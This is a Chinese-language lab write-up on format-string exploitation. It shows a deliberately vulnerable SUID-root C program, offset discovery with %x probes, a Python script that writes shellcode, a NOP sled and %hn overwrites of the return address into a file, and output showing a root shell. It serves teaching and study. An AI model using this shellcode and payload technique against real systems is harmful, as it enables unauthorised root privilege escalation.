#
#### 漏洞程序
目标:利用格式化漏洞任意目标地址写入任意值。  
```
#include <stdio.h>

void fmtstr(char *str)
{
    unsigned int *framep;
    unsigned int *ret;
    asm("movl %%ebp, %0": "=r"(framep));  // asm内嵌汇编语法，把ebp赋值给framep
    ret = framep + 1;
    printf("The address of the input array: 0x%.8x\n", (unsigned)str);
    printf("The value of the frame pointer: 0x%.8x\n", (unsigned)framep);
    printf("The value of the return address: 0x%.8x\n", *ret);
    printf(str);
    printf("\nThe value of the return address: 0x%.8x\n", *ret);

}

void main()
{
    FILE *badfile;
    char str[200];

    badfile = fopen("badfile", "rb");
    fread(str, sizeof(char), 200, badfile);
    fmtstr(str);
}
```

```
ubuntu@VM-0-17-ubuntu:~$ gcc -z execstack -o fmtvul fmtvul.c 

ubuntu@VM-0-17-ubuntu:~$ sudo chown root fmtvul
ubuntu@VM-0-17-ubuntu:~$ sudo chmod 4755 fmtvul
ubuntu@VM-0-17-ubuntu:~$ touch badfile
ubuntu@VM-0-17-ubuntu:~$ ./fmtvul 
The address of the input array: 0xbffff574
The value of the frame pointer: 0xbffff558
The value of the return address: 0x080485b9

The value of the return address: 0x080485b9
```


#### 攻击步骤
1.注入恶意代码到栈中  
2.找到恶意代码的起始地址   
3.找到返回地址的位置  
4.把恶意代码写入返回地址  

为了简化试验：直接打印出了ebp的值和返回地址，不然需要像缓冲区溢出那章节中那样通过gdb找到这些值    

知道帧栈的布局后，可以得知返回地址在帧栈指针上面四个字节。所以返回地址是 0xbffff558 + 4 = 0xbffff55c  
为了提高效率，还是以2字节为目标。所以把0xbffff55c分为0xbffff55c和0xbffff55e。   
由于恶意代码就放在输入数据中，把恶意代码放在数组尾部，并在它前面填满NOP指令（0x90）,这样只要跳转其中一个NOP上就能到达恶意代码。因此`0xbffff574` + `0x90` = `0xBFFFF604`  
因为小端序，所以把0xF604(10进制62980)放入0xbffff55c， 把0xBFFF(10进制49151)放入0xbffff55e   

因为 49151 < 62980,所以先给0xbffff55e地址赋值。  
所以是 `\x5E\xF5\xFF\xBF@@@@\x5C\xF5\xFF\xBF` 这样的顺序  


通过错法找到print调用时输入的字符串地址  
```
ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\x5E\xF5\xFF\xBF@@@@\x5C\xF5\xFF\xBF"):%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x > badfile 
ubuntu@VM-0-17-ubuntu:~$ ./fmtvul 
The address of the input array: 0xbffff574
The value of the frame pointer: 0xbffff558
The value of the return address: 0x080485b9
^���@@@@\���:080485b9:b7fcd000:b7e19700:bffff648:b7ff0010:bffff558:bffff55c:b7fcd000:b7fcd000:bffff648:080485b9:bffff574:00000001:000000c8:0804b008:0804b008:bffff55e:40404040:bffff55c:382e253a:2e253a78:253a7838:3a78382e:78382e25:382e253a:2e253a78:253a7838:3a78382e:78382e25:382e253a:2e253a78:253a7838:3a78382e:78382e25:382e253a:2e253a78:253a7838:
The value of the return address: 0x080485b9
```
可以看到输入字符串第一个地址在第17个`%.8x`的位置，也就是前面需要16个%x才能到达字符串的地址。   


**生成badfile**  
```
shellcode = (
    "\x31\xc0"
    "\x31\xdb"
    "\xb0\xd5"
    "\xcd\x80"
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')

N = 200

content = bytearray(0x90 for i in range(N))
start = N - len(shellcode)
# 把shellcode放在尾部
content[start:] = shellcode

# 把返回值域的地址放在格式化字符串的头部
addr1 = 0xBFFFF55E
addr2 = 0xBFFFF55C
content[0:4] = (addr1).to_bytes(4, byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr2).to_bytes(4, byteorder='little')

# 加上%x和%hn
small = 0xBFFF - 12 - 15*8
large = 0xF604 - 0xBFFF
s = "%.8x"*15 + "%." + str(small) + "x%hn%." + str(large) + "x%hn"

fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt
file = open("badfile", "wb")
file.write(content)
file.close()
```

**发动攻击**  
```
ubuntu@VM-0-17-ubuntu:~$ ./fmtvul 
...
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040404040��������������������������������������������������������������������������1�1۰�̀1�Ph//shh/bin��PS�ᙰ

The value of the return address: 0xbffff604
# id
uid=0(root) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)

```
成功执行恶意代码拿到root权限  



**减少格式化字符串个数**  
可以使用格式化字符串的参数域(k$,k是可变参数)  
```
int main(int argc, char *argv[])
{
    printf("%9$.1x",1,2,3,4,5,6,7,8,9,0);
}
```
直接作用在第九个格式化符上,所以打印输出是9  


因此可以直接优化成如下部分  
```
small = 0xBFFF - 12
large = 0xF604 - 0xBFFF
s = "%." + str(small) + "x" + "%17$hn" + "%." + str(large) + "x" + "%19$hn"
```











